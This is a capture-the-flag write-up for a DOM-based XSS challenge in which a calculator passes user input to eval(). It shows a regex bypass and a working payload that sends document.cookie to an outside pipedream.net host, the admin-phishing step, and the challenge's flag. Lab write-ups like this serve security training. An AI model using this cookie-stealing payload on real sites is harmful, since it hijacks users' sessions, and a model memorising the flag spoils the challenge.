# XSS DOM Based - Eval

In this chall, you will be provided with a calculator that can add, substract, multiply and divide. There is only one input field so we will attack on that.

<p align="center">
  <img src="https://raw.githubusercontent.com/quochuyy10217/MyCTFWriteups/main/rootme/img_src/XSS_DOM_Based_Eval1.png" />
</p>

Enter a string and this is what you'll get.

<p align="center">
  <img src="https://raw.githubusercontent.com/quochuyy10217/MyCTFWriteups/main/rootme/img_src/XSS_DOM_Based_Eval2.png" />
</p>

If you look carefully, the regex is not very hard to bypass. Just enter an expression at the start of the input, after that we can do anything we want.

Now I wil tell you how to solve this challenge. The `eval()` function can execute one or more commands in only one call like this:
`eval(<expression1>,<expression2>,<expression3>)`. For example, if you use `eval(alert(1),alert(2))`, you will get 2 popup alert box. So we will leverage this and solve this challenge. The payload to exploit this challenge will be like `1+1,<your payload>`. We use `1+1` to bypass the regex, after that we will use `,` to pass another parameter to the `eval()` function, that is our payload. However, if you use alert(), you will get this:

<p align="center">
  <img src="https://raw.githubusercontent.com/quochuyy10217/MyCTFWriteups/main/rootme/img_src/XSS_DOM_Based_Eval3.png" />
</p>


The `()` is filtered, so I used `document.location` to XSS, and It's success! The payload I used to solved this challenge is  

```javascript

1+1,document.location="https://eo3f8xwoiu4uj8s.m.pipedream.net/?"+document.cookie

```

Enter the payload, then grab the url and send it to admin using Contact feature. Wait for a short time and the flag is arrived :D

<p align="center">
  <img src="https://raw.githubusercontent.com/quochuyy10217/MyCTFWriteups/main/rootme/img_src/XSS_DOM_Based_Eval4.png" />
</p>


Flag is `rootme{Eval_Is_DangER0us}`

<p align="center">
  <img src="https://raw.githubusercontent.com/quochuyy10217/MyCTFWriteups/main/rootme/img_src/XSS_DOM_Based_Eval5.png" />
</p>
